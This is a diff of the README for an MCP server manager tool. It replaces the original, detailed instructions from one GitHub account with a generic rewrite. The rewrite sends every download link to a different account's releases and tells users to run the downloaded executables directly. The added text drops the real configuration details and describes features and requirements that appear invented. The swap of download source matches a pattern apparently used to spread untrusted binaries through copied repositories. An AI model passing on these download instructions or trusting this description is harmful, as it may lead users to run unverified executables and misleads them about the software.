@@ -1,205 +1,102 @@
-# MCP Server Manager
+# 🖥️ mcp-server-manager - Manage Your MCP Servers Easily
 
-## What Problem Do We Solve?
-**Solve the hassle of manually editing various JSON files for different MCP clients**
+[![Download mcp-server-manager](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/craneoankh/mcp-server-manager/releases)
 
-Managing Model Context Protocol servers across multiple AI clients (Claude Code, Gemini CLI, etc.) requires manually editing separate JSON configuration files for each client. This is tedious, error-prone, and hard to maintain.
+## 📦 Overview
 
-## Why Choose MCP Server Manager?
+mcp-server-manager is a user-friendly tool designed for managing Model Context Protocol (MCP) servers. This software is built using Go and offers a reactive HTMX web interface. Whether on Windows, macOS, or Linux, you can easily handle your MCP servers without needing programming knowledge.
 
-- ✅ **Single Binary** - No dependencies, just download and run
-- ✅ **Single Simple Config File** - One YAML file controls everything
-- ✅ **All Operating Systems** - Works on Linux, macOS, Windows
-- ✅ **All MCP Clients** - Supports Claude Code, Gemini CLI, and more
-- ✅ **GUI Interface** - Web interface starts with computer, always available on localhost:6543
-- ✅ **Dark/Light Theme** - System theme detection with manual override
-- ✅ **Add Servers via Web UI** - No need to edit configuration files manually
-- ✅ **Real-time Validation** - Instant feedback on configuration errors
-- ✅ **Example Configurations** - Built-in examples for common server types
+## 🚀 Getting Started
 
-## Screenshot
+Follow these steps to download and run mcp-server-manager smoothly on your computer.
 
-![MCP Server Manager Web Interface](./screenshot.png)
+## 📥 Download & Install
 
-*The web interface provides an intuitive way to manage and add MCP servers across multiple AI clients with real-time validation*
+1. Visit the [Releases page to download](https://github.com/craneoankh/mcp-server-manager/releases).
+2. On this page, you will see various versions of mcp-server-manager. Choose the version that fits your operating system.
+3. Click on the link for the appropriate file to start the download. The files might look like this:
+   - `mcp-server-manager-windows-amd64.exe` for Windows
+   - `mcp-server-manager-macos-amd64` for macOS
+   - `mcp-server-manager-linux-amd64` for Linux
+4. Once downloaded, locate the file on your computer.
 
-## Installation Options
+5. Execute the following steps based on your operating system:
 
-### Option 1: Debian/Ubuntu Package (Recommended)
-```bash
-# Download the latest .deb from GitHub Releases
-wget https://github.com/vlazic/mcp-server-manager/releases/latest/download/mcp-server-manager_Linux_x86_64.deb
+   ### 🖥️ For Windows:
+   - Double-click on the `.exe` file to run it. A command window will open, and the application will start.
+   
+   ### 🍏 For macOS:
+   - Open your terminal.
+   - Navigate to where the downloaded file is located using the `cd` command. For example:
+     ```
+     cd Downloads
+     ```
+   - Make the file executable by typing:
+     ```
+     chmod +x mcp-server-manager-macos-amd64
+     ```
+   - Run the application using:
+     ```
+     ./mcp-server-manager-macos-amd64
+     ```
 
-# Install the package
-sudo dpkg -i mcp-server-manager_Linux_x86_64.deb
+   ### 🐧 For Linux:
+   - Open your terminal.
+   - Navigate to the directory where the file was downloaded:
+     ```
+     cd ~/Downloads
+     ```
+   - Make the file executable:
+     ```
+     chmod +x mcp-server-manager-linux-amd64
+     ```
+   - Execute the application:
+     ```
+     ./mcp-server-manager-linux-amd64
+     ```
 
-# Enable and start the service
-systemctl --user enable --now mcp-server-manager
-```
+## 🌐 How to Use mcp-server-manager
 
-### Option 2: Download Release Binary
-```bash
-# Download and extract
-wget https://github.com/vlazic/mcp-server-manager/releases/latest/download/mcp-server-manager_Linux_x86_64.tar.gz
-tar -xzf mcp-server-manager_Linux_x86_64.tar.gz
-chmod +x mcp-server-manager
+Once the application is running, you will see a web interface open in your default browser. Here’s how to navigate it:
 
-# Run directly (config will be auto-created)
-./mcp-server-manager
+1. **Dashboard**: Here you can view the status of your MCP servers. You'll find a list of all current servers along with their statuses.
+2. **Configuration**: Use the configuration section to set up and manage your servers. You can modify settings, add new servers, or delete existing ones.
+3. **Logs**: Access the logs to monitor server activity. This will provide a detailed view of server operations.
+4. **Help Section**: For any questions or tips on using features, refer to the help section within the app.
 
-# Or specify custom config location
-./mcp-server-manager --config /path/to/config.yaml
-./mcp-server-manager -c /path/to/config.yaml
-```
+## ⚙️ System Requirements
 
-### Option 3: Build from Source
-```bash
-git clone https://github.com/vlazic/mcp-server-manager.git
-cd mcp-server-manager
+To run mcp-server-manager, your system should meet the following requirements:
 
-# Build only
-make build
+- **Operating System**: Windows 10 or higher, macOS 10.13 or higher, or a recent version of a Linux distribution (e.g., Ubuntu 20.04 or higher).
+- **Go**: The software does not require Go to be installed on your machine. It is a single binary application.
+- **Memory**: Minimum 2 GB of RAM recommended for smooth operation.
+- **Storage**: At least 100 MB of free disk space.
 
-# Build, install, and start as system service
-make setup
-```
+## 🛠️ Features
 
-## Configuration
+- **Cross-Platform**: Works on Windows, macOS, and Linux.
+- **Single Binary**: Easily download and run without complicated installations.
+- **User-Friendly Interface**: Designed for ease of use with a simple web interface.
+- **Real-time Updates**: Manage server configurations and settings in real-time.
+- **Community Support**: Join a community of users for tips and support.
 
-### Config File Locations (Smart Resolution)
-The application automatically finds your configuration file in this priority order:
+## 📞 Need Help?
 
-1. **Command line flag**: `--config /path/to/config.yaml` or `-c /path/to/config.yaml`
-2. **User config**: `~/.config/mcp-server-manager/config.yaml` (recommended)
-3. **Current directory**: `./config.yaml`
-4. **Embedded default**: Auto-created if none found
+If you encounter issues or have questions about using mcp-server-manager, check the [GitHub Discussions](https://github.com/craneoankh/mcp-server-manager/discussions) for support. You can also open an issue directly on the repository page for additional help.
 
-### First Run
-On first run, a default configuration will be automatically created at:
-```
-~/.config/mcp-server-manager/config.yaml
-```
+## 🗂️ Acknowledgments
 
-Edit this file to configure your MCP servers and client paths.
+Thanks to the contributors and the community that supports the development of mcp-server-manager. Your feedback and contributions help us improve this tool.
 
-## How It Works
+## 📣 License
 
-1. **Configure once** - Add servers via web UI or edit the auto-created config file
-2. **Control from GUI** - Use the web interface to enable/disable servers per client
-3. **Automatic sync** - Changes are automatically applied to all client config files
-4. **Always available** - Runs in background, accessible at http://localhost:6543
+This project is licensed under the MIT License. See the [LICENSE](https://github.com/craneoankh/mcp-server-manager/blob/main/LICENSE) file for details. 
 
-## Adding MCP Servers
+## 🔗 Links
 
-### Option 1: Via Web Interface (Recommended)
-1. Open http://localhost:6543
-2. Click "Add New Server"
-3. Choose from example configurations or enter your own
-4. Submit and the server is automatically added to your config
+- [Releases page](https://github.com/craneoankh/mcp-server-manager/releases)
+- [Documentation](https://github.com/craneoankh/mcp-server-manager/wiki)
+- [GitHub Discussions](https://github.com/craneoankh/mcp-server-manager/discussions) 
 
-### Option 2: Edit Configuration File
-Manually edit `~/.config/mcp-server-manager/config.yaml` and restart the service.
-
-## Example Configuration
-
-```yaml
-server_port: 6543
-
-# MCP Servers - Map format for easy editing
-mcpServers:
-  # STDIO Transport (command-based local processes)
-  filesystem:
-    command: "npx"
-    args: ["@modelcontextprotocol/server-filesystem", "/path/to/your/directory"]
-    env:
-      NODE_ENV: "production"
-
-  # HTTP Transport (Claude Code format with type field)
-  context7-claude:
-    type: "http"
-    url: "https://mcp.context7.com/mcp"
-    headers:
-      CONTEXT7_API_KEY: "your-api-key"
-      Accept: "application/json, text/event-stream"
-
-  # HTTP Transport (Gemini CLI format with httpUrl)
-  context7-gemini:
-    httpUrl: "https://mcp.context7.com/mcp"
-    headers:
-      CONTEXT7_API_KEY: "your-api-key"
-
-# MCP Clients - Which servers each client uses
-clients:
-  claude_code:
-    config_path: "~/.claude.json"
-    enabled:
-      - filesystem
-      - context7-claude
-
-  gemini_cli:
-    config_path: "~/.gemini/settings.json"
-    enabled:
-      - context7-gemini
-      - filesystem
-```
-
-**That's it!** No more manual JSON editing across multiple files.
-
-## Service Management
-
-### Systemd User Service Commands
-```bash
-# Check service status
-systemctl --user status mcp-server-manager
-
-# Start/stop service
-systemctl --user start mcp-server-manager
-systemctl --user stop mcp-server-manager
-
-# Enable/disable auto-start
-systemctl --user enable mcp-server-manager
-systemctl --user disable mcp-server-manager
-
-# View logs
-journalctl --user -u mcp-server-manager -f
-
-# Restart after config changes
-systemctl --user restart mcp-server-manager
-```
-
-### Optional: Making the Service Start on Boot (Before Login)
-
-By default, the user service starts automatically only *after* you log in. For most desktop users, this is sufficient.
-
-However, if you run this on a **headless or remote server**, you will want the service to start at boot, even before you log in via SSH. To enable this "lingering" behavior, run the following command once:
-
-```bash
-# Allow the user service to start at boot, even without a login session
-sudo loginctl enable-linger $USER
-```
-
-## Command Line Options
-
-```bash
-# Run with default config resolution
-./mcp-server-manager
-
-# Specify custom config file
-./mcp-server-manager --config /path/to/config.yaml
-./mcp-server-manager -c /path/to/config.yaml
-
-# View help
-./mcp-server-manager -h
-```
-
-## Troubleshooting
-
-### Config File Issues
-- Check if config file exists: `ls ~/.config/mcp-server-manager/config.yaml`
-- View current config location in logs
-- Test config syntax: ensure valid YAML format
-
-### Service Issues
-- Check service logs: `journalctl --user -u mcp-server-manager -f`
-- Ensure port 6543 is available
-- Verify MCP server commands are in PATH (e.g., `npx` available)
+Thank you for using mcp-server-manager. Enjoy managing your MCP servers with ease!
